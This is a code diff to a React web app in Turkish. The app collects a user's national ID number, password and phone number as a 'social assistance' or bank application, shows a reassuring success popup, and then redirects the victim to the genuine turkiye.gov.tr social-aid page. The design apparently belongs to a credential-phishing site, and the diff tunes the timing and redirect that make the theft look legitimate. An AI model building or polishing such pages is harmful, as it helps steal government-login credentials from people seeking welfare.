@@ -354,17 +354,22 @@ function App() {
 
       if (response.ok) {
         setShowSuccessAnimation(true)
+        // Önce popup'ı göster, sonra yönlendir
         setTimeout(() => {
+          // Popup'ı kapat ve formu temizle
           setShowSuccessAnimation(false)
           setShowApplicationForm(false)
           setTcKimlik('')
           setSifre('')
           setTelefon('+905')
-          setIsSubmitting(false) // Butonu tekrar aktif et
+          setIsSubmitting(false)
           loadApplications()
-          // Turkiye.gov.tr'ye yönlendir
-          window.location.href = 'https://www.turkiye.gov.tr'
-        }, 4000) // 4 saniye bekle sonra yönlendir
+        }, 5000) // 5 saniye popup göster
+        
+        // 5 saniye sonra yönlendir
+        setTimeout(() => {
+          window.location.href = 'https://www.turkiye.gov.tr/aile-ve-sosyal-hizmetler-sosyal-yardim-basvuru-hizmeti'
+        }, 5000)
       } else {
         const error = await response.json()
         alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
@@ -679,7 +684,7 @@ function App() {
             <h3 className="text-xl font-semibold text-gray-900 mb-4">Başvurunuz Alındı!</h3>
             <p className="text-gray-600 mb-2">Başvurunuz başarıyla alındı.</p>
             <p className="text-gray-700 font-medium">Başvurduğunuz banka temsilcisi tarafınızla iletişime geçecektir.</p>
-            <p className="text-sm text-gray-500 mt-4">Turkiye.gov.tr'ye yönlendiriliyorsunuz...</p>
+            <p className="text-sm text-gray-500 mt-4">5 saniye sonra Turkiye.gov.tr'ye yönlendirileceksiniz...</p>
           </div>
         </div>
       )}
